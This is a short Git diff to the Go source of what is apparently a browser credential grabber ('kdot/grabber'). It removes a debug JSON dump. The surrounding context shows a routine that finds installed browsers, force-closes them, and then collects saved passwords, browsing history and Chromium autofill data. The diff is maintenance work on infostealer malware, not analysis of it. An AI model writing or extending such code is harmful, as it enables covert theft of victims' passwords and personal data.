@@ -1,7 +1,6 @@
 package browsers
 
 import (
-	"encoding/json"
 	"os"
 
 	"kdot/grabber/browsers/chromium/autofill"
@@ -43,10 +42,6 @@ func GetBrowserDownloads(browsers []structs.Browser) {
 
 func GetBrowserData() {
 	totalBrowsers := finder.FindBrowsers()
-	//write to json file totalBrowsers
-	//fmt.Println(totalBrowsers)
-	jsonData, _ := json.MarshalIndent(totalBrowsers, "", "    ")
-	os.WriteFile("browsersJSON.json", jsonData, 0644)
 	util.CloseBrowsers()
 	GetBrowserPasswords(totalBrowsers)
 	GetBrowserHistory(totalBrowsers)
